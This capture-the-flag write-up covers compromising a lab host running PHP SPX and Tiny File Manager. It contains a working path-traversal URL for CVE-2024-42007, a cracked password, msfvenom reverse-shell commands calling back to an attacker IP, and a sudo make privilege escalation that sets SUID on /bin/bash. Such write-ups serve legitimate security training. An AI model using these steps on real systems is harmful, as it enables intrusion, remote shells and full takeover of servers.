#Pwned! 
```IP
192.168.192.108
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.192.108 -vvv -p- -oN enum/full
```
The output being:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=
|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Tiny File Manager
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## HTTP 80
apache 2.4.52
default credentials **admin/admin, admin/password, admin/admin@123 and user/12345** doesnt work

in /phpinfo.php we find SPX version 0.4.15 
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205115755.png?raw=true)


# Exploitation

we try to exploit SPX path traversal vulnerability
https://www.vicarius.io/vsociety/posts/novel-escape-from-the-spx-jungle-path-traversal-in-php-spx-cve-2024-42007
we get the following error
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205121754.png?raw=true)
reviewing the code we can see that the SPX_KEY parameter is set to 'dev'
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205121835.png?raw=true)

we have another key in the phpinfo.php
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205121918.png?raw=true)
lets edit the script and save it
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205121943.png?raw=true)
Now we get a file
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205122014.png?raw=true)

```
http://192.168.192.108/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2findex.php
```
with this we get the source code

which has some hashes
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205124146.png?raw=true)
```
$2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205131500.png?raw=true)
once cracked, we try ssh to the machine unsuccessfully. We will try to exploit the authenticated rce from the web

```
msfvenom -p php/reverse_php LHOST=192.168.45.204 LPORT=80 -o ../shell.php
```
we upload the latter shell to http://192.168.192.108/index.php?p=&upload
and we execute it
http://192.168.192.108/shell.php
we have now revshell as www data
I created yet another shell for a more stable stty
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.204 LPORT=4444 -f elf > shell.elf
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205133923.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205133936.png?raw=true)


# PrivEsc

## Manual
```
su - profiler
```
lowprofile as password
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205154956.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205155212.png?raw=true)
it executes the following command
```
/bin/sh /root/php-spx/libtool --mode=install cp ./spx.la /root/php-spx/modules
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205155741.png?raw=true)
we change the following line
```
SHELL = /bin/sh
```
for
```
SHELL = /tmp/sh
```


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205160140.png?raw=true)
then we will create in the /tmp directory an sh file which will contain the following lines:
```
#!/bin/bash
chmod u+s /bin/bash
```
we execute once again our sudo command, which will execute our file /tmp/sh
```
sudo /usr/bin/make install -C /home/profiler/php-spx
```
and with 
```
bash -p
```
we assess that we are root now!
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205160549.png?raw=true)

## Automated

### Peass
### Mimikatz

# Lateral Movement

